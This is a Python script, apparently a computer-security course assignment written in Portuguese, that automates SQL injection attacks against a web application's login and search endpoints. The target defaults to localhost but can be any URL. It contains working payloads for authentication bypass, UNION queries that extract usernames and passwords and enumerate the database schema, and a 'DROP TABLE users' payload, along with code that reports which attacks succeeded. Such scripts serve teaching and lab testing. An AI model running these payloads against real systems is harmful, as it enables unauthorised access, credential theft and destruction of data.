#!/usr/bin/env python3
"""
Simulador de Ataques SQL Injection
Trabalho Prático 02 - Segurança Computacional
"""

import requests
import time
import random
import json
from datetime import datetime
import sys

class SQLInjectionAttackSimulator:
    def __init__(self, target_url="http://localhost:5000"):
        self.target_url = target_url
        self.login_endpoint = f"{target_url}/login"
        self.search_endpoint = f"{target_url}/search"
        
        # Payloads de SQL Injection para teste
        self.login_payloads = [
            {"username": "admin' # ", "password": "qualquer"},
            {"username": "' OR 1=1 # ", "password": "qualquer"},
            {"username": "admin' OR '1'='1' # ", "password": "qualquer"},
            {"username": "' OR 'a'='a' # ", "password": "qualquer"},
            {"username": "admin' -- ", "password": "qualquer"},
            {"username": "' UNION SELECT 1,2,3,4,5,6 # ", "password": "qualquer"},
            {"username": "admin", "password": "' OR 1=1 # "},
            {"username": "admin", "password": "' OR 'x'='x' # "},
        ]
        
        self.search_payloads = [
            "' OR 1=1 # ",
            "' UNION SELECT id,username,password,email,role,created_at FROM users # ",
            "' UNION SELECT 1,2,3,4,5,6 # ",
            "' OR 'a'='a' # ",
            "'; DROP TABLE users # ",
            "' UNION SELECT COUNT(*),2,3,4,5,6 FROM users # ",
            "' UNION SELECT TABLE_NAME,2,3,4,5,6 FROM INFORMATION_SCHEMA.TABLES # ",
            "' UNION SELECT COLUMN_NAME,2,3,4,5,6 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' # ",
        ]
        
        # Resultados dos ataques
        self.results = []
        
    def test_connection(self):
        """Testar conexão com o alvo"""
        try:
            response = requests.get(self.target_url, timeout=5)
            if response.status_code == 200:
                print(f"✅ Conexão estabelecida com {self.target_url}")
                return True
            else:
                print(f"❌ Erro de conexão: Status {response.status_code}")
                return False
        except Exception as e:
            print(f"❌ Erro de conexão: {e}")
            return False
            
    def attack_login(self, payload):
        """Executar ataque no endpoint de login"""
        try:
            print(f"🎯 Testando login: {payload['username']}")
            
            response = requests.post(
                self.login_endpoint,
                data=payload,
                timeout=10
            )
            
            result = {
                "timestamp": datetime.now().isoformat(),
                "endpoint": "login",
                "payload": payload,
                "status_code": response.status_code,
                "response_size": len(response.text),
                "success": False
            }
            
            if response.status_code == 200:
                try:
                    json_response = response.json()
                    result["response_data"] = json_response
                    result["success"] = json_response.get("success", False)
                    
                    if result["success"]:
                        print(f"  ✅ Ataque bem-sucedido!")
                        if "user" in json_response:
                            print(f"  👤 Usuário comprometido: {json_response['user']}")
                    else:
                        print(f"  ❌ Ataque falhou: {json_response.get('message', 'Erro desconhecido')}")
                        
                except json.JSONDecodeError:
                    result["response_data"] = response.text[:200]
                    print(f"  ⚠️ Resposta não é JSON válido")
            else:
                print(f"  ❌ Erro HTTP: {response.status_code}")
                
            self.results.append(result)
            return result
            
        except Exception as e:
            print(f"  ❌ Erro na requisição: {e}")
            return None
            
    def attack_search(self, payload):
        """Executar ataque no endpoint de busca"""
        try:
            print(f"🔍 Testando busca: {payload}")
            
            response = requests.post(
                self.search_endpoint,
                data={"search_term": payload},
                timeout=10
            )
            
            result = {
                "timestamp": datetime.now().isoformat(),
                "endpoint": "search",
                "payload": {"search_term": payload},
                "status_code": response.status_code,
                "response_size": len(response.text),
                "success": False
            }
            
            if response.status_code == 200:
                try:
                    json_response = response.json()
                    result["response_data"] = json_response
                    result["success"] = json_response.get("success", False)
                    
                    if result["success"]:
                        print(f"  ✅ Ataque bem-sucedido!")
                        if "products" in json_response:
                            products = json_response["products"]
                            print(f"  📦 {len(products)} registros extraídos")
                            
                            # Verificar se extraiu dados de usuários
                            for product in products[:3]:  # Mostrar apenas os primeiros 3
                                if "admin" in str(product).lower() or "password" in str(product).lower():
                                    print(f"  🚨 Dados sensíveis detectados: {product}")
                    else:
                        print(f"  ❌ Ataque falhou: {json_response.get('message', 'Erro desconhecido')}")
                        
                except json.JSONDecodeError:
                    result["response_data"] = response.text[:200]
                    print(f"  ⚠️ Resposta não é JSON válido")
            else:
                print(f"  ❌ Erro HTTP: {response.status_code}")
                
            self.results.append(result)
            return result
            
        except Exception as e:
            print(f"  ❌ Erro na requisição: {e}")
            return None
            
    def run_attack_simulation(self, delay=2):
        """Executar simulação completa de ataques"""
        print(f"🚀 Iniciando simulação de ataques SQL Injection")
        print(f"🎯 Alvo: {self.target_url}")
        print(f"⏱️ Delay entre ataques: {delay}s")
        print("=" * 60)
        
        if not self.test_connection():
            print("❌ Não foi possível conectar ao alvo. Verifique se a aplicação está rodando.")
            return
            
        # Ataques no login
        print(f"\n🔐 Testando {len(self.login_payloads)} payloads no login...")
        for i, payload in enumerate(self.login_payloads, 1):
            print(f"\n[{i}/{len(self.login_payloads)}] Ataque no login:")
            self.attack_login(payload)
            time.sleep(delay)
            
        # Ataques na busca
        print(f"\n🔍 Testando {len(self.search_payloads)} payloads na busca...")
        for i, payload in enumerate(self.search_payloads, 1):
            print(f"\n[{i}/{len(self.search_payloads)}] Ataque na busca:")
            self.attack_search(payload)
            time.sleep(delay)
            
        self.generate_report()
        
    def generate_report(self):
        """Gerar relatório dos ataques"""
        print("\n" + "=" * 60)
        print("📊 RELATÓRIO DE ATAQUES")
        print("=" * 60)
        
        total_attacks = len(self.results)
        successful_attacks = len([r for r in self.results if r["success"]])
        
        print(f"Total de ataques: {total_attacks}")
        print(f"Ataques bem-sucedidos: {successful_attacks}")
        print(f"Taxa de sucesso: {(successful_attacks/total_attacks)*100:.1f}%")
        
        # Ataques por endpoint
        login_attacks = [r for r in self.results if r["endpoint"] == "login"]
        search_attacks = [r for r in self.results if r["endpoint"] == "search"]
        
        print(f"\nAtaques no login: {len(login_attacks)} ({len([r for r in login_attacks if r['success']])} sucessos)")
        print(f"Ataques na busca: {len(search_attacks)} ({len([r for r in search_attacks if r['success']])} sucessos)")
        
        # Salvar relatório em arquivo
        report_file = f"attack_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(self.results, f, indent=2)
            
        print(f"\n💾 Relatório detalhado salvo em: {report_file}")
        print("✅ Simulação de ataques concluída!")

def main():
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        target_url = "http://localhost:5000"
        
    simulator = SQLInjectionAttackSimulator(target_url)
    
    try:
        simulator.run_attack_simulation(delay=1)
    except KeyboardInterrupt:
        print("\n\n⚠️ Simulação interrompida pelo usuário")
        simulator.generate_report()

if __name__ == "__main__":
    main() 